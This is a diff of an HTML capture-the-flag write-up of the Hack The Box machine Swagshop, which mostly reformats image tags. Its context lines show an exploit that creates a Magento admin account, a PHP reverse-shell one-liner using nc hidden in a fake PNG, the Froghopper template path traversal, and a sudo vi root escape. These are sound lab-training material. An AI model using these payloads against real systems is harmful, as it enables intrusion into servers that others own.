@@ -78,8 +78,8 @@
   <hr>
 
 <h2 id="quick-summary">Quick Summary</h2>
-<p><br>Hey guys, today Swagshop retired and here’s my write-up about it. It was a very easy box, it had an outdated version of Magento which had a lot of vulnerabilities that allowed me to get command execution. The user could run <code class="highlighter-rouge">vi</code> with <code class="highlighter-rouge">sudo</code> as root so I used the basic vi/vim escape to get a root shell. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.140</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">swagshop.htb</code>. Let’s jump right in !<br>
-<img src="/images/hackthebox/swagshop/0.png" alt="">
+<p><br>Hey guys, today Swagshop retired and here’s my write-up about it. It was a very easy box, it had an outdated version of Magento which had a lot of vulnerabilities that allowed me to get command execution. The user could run <code class="highlighter-rouge">vi</code> with <code class="highlighter-rouge">sudo</code> as root so I used the basic vi/vim escape to get a root shell. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.140</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">swagshop.htb</code>. Let’s jump right in !
+<br><img src="/images/hackthebox/swagshop/0.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -111,7 +111,7 @@ root@kali:~/Desktop/HTB/boxes/swagshop#
 
 <h2 id="web-enumeration-creating-an-admin-user">Web Enumeration, Creating an admin user</h2>
 <p><br><code class="highlighter-rouge">http://swagshop.htb/</code> :<br>
-<img src="/images/hackthebox/swagshop/1.png" alt="">
+<br><img src="/images/hackthebox/swagshop/1.png" alt=""><br>
 <br>On port 80 there’s a web application called <a href="https://magento.com/" target="_blank" rel="noopener noreferrer">Magento</a>.</p>
 
 <blockquote>
@@ -120,7 +120,7 @@ root@kali:~/Desktop/HTB/boxes/swagshop#
 
 <p><br>By looking at the bottom I saw that the version is from 2014 which is very outdated, so I searched for exploits and <a href="https://www.exploit-db.com/exploits/37977" target="_blank" rel="noopener noreferrer">this one</a> which creates a new admin user worked, but I had to edit it first.
 <br>By browsing the web application I noticed that all paths are after <code class="highlighter-rouge">/index.php</code>, for example the login page :
-<img src="/images/hackthebox/swagshop/2.png" alt=""></p>
+<br><img src="/images/hackthebox/swagshop/2.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://swagshop.htb/index.php/customer/account/login/
 </code></pre></div></div>
 <p><br>So I set the target to <code class="highlighter-rouge">http://swagshop.htb/index.php</code> and I changed the credentials from <code class="highlighter-rouge">forme : forme</code> to <code class="highlighter-rouge">rick : rick</code> :</p>
@@ -165,11 +165,8 @@ INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role
 WORKED
 Check http://swagshop.htb/index.php/admin with creds rick:rick
 </code></pre></div></div>
-<p><br>
-<img src="/images/hackthebox/swagshop/3.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/swagshop/4.png" alt="">
+<p><br><img src="/images/hackthebox/swagshop/3.png" alt=""><br>
+<br><img src="/images/hackthebox/swagshop/4.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -177,11 +174,11 @@ Check http://swagshop.htb/index.php/admin with creds rick:rick
 <p><br>This machine had several paths for getting RCE but it has been patched several times and now the only method I could use is an attack called froghopper. 
 <br>As demonstrated in <a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper" target="_blank" rel="noopener noreferrer">this article</a> I started by allowing symlinks in template settings :
 <br>System –&gt; Configuration :<br>
-<img src="/images/hackthebox/swagshop/5.png" alt="">
+<br><img src="/images/hackthebox/swagshop/5.png" alt=""><br>
 <br>Advanced –&gt; Developer :<br>
-<img src="/images/hackthebox/swagshop/6.png" alt="">
+<br><img src="/images/hackthebox/swagshop/6.png" alt=""><br>
 <br> Template Settings –&gt; Allow Symlinks :<br>
-<img src="/images/hackthebox/swagshop/7.png" alt="">
+<br><img src="/images/hackthebox/swagshop/7.png" alt=""><br>
 <br>Then I got a blank <code class="highlighter-rouge">png</code> image and echoed a <code class="highlighter-rouge">php</code> reverse shell to it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/swagshop# echo '&lt;?php' &gt;&gt; shell.php.png
 root@kali:~/Desktop/HTB/boxes/swagshop# echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f");' &gt;&gt; shell.php.png
@@ -189,37 +186,29 @@ root@kali:~/Desktop/HTB/boxes/swagshop# echo '?&gt;' &gt;&gt; shell.php.png
 </code></pre></div></div>
 <p><br>I uploaded the image as a category thumbnail :
 <br>Catalog –&gt; Manage Categories :<br>
-<img src="/images/hackthebox/swagshop/8.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/swagshop/9.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/swagshop/10.png" alt="">
+<br><img src="/images/hackthebox/swagshop/8.png" alt=""><br>
+<br><img src="/images/hackthebox/swagshop/9.png" alt=""><br>
+<br><img src="/images/hackthebox/swagshop/10.png" alt=""><br>
 <br>Now if we check <code class="highlighter-rouge">/media/catalog/category/shell.php.png</code> the image should be there :<br>
-<img src="/images/hackthebox/swagshop/11.png" alt="">
+<br><img src="/images/hackthebox/swagshop/11.png" alt=""><br>
 <br>Last step is to create the newsletter template and inject the payload :
 <br>Newsletter –&gt; Newsletter Templates :<br>
-<img src="/images/hackthebox/swagshop/12.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/swagshop/13.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/swagshop/14.png" alt=""></p>
+<br><img src="/images/hackthebox/swagshop/12.png" alt=""><br>
+<br><img src="/images/hackthebox/swagshop/13.png" alt=""><br>
+<br><img src="/images/hackthebox/swagshop/14.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'
 </code></pre></div></div>
 <p><br>Then I saved the template and clicked on the preview template button :
-<img src="/images/hackthebox/swagshop/15.png" alt="">
+<br><img src="/images/hackthebox/swagshop/15.png" alt=""><br>
 <br>And I got a shell :<br>
-<img src="/images/hackthebox/swagshop/16.png" alt="">
+<br><img src="/images/hackthebox/swagshop/16.png" alt=""><br>
 <br>We owned user.
 <br></p>
 <hr>
 
 <h2 id="privilege-escalation-root-flag">Privilege Escalation, Root Flag</h2>
 <p><br>First thing I did after getting a shell was to get a stable tty shell :<br>
-<img src="/images/hackthebox/swagshop/17.png" alt="">
+<br><img src="/images/hackthebox/swagshop/17.png" alt=""><br>
 <br>I checked <code class="highlighter-rouge">sudo</code> and found that <code class="highlighter-rouge">www-data</code> can run <code class="highlighter-rouge">vi</code> as root on any file in <code class="highlighter-rouge">/var/www/html/</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/var/www/html$ sudo -l 
 Matching Defaults entries for www-data on swagshop:
@@ -234,10 +223,8 @@ www-data@swagshop:/var/www/html$
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/index.php
 </code></pre></div></div>
 <p><br>Then I executed <code class="highlighter-rouge">/bin/bash</code> from vi :<br>
-<img src="/images/hackthebox/swagshop/18.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/swagshop/19.png" alt="">
+<br><img src="/images/hackthebox/swagshop/18.png" alt=""><br>
+<br><img src="/images/hackthebox/swagshop/19.png" alt=""><br>
 <br>
 <br>And we owned root !
 <br>That’s it , Feedback is appreciated !
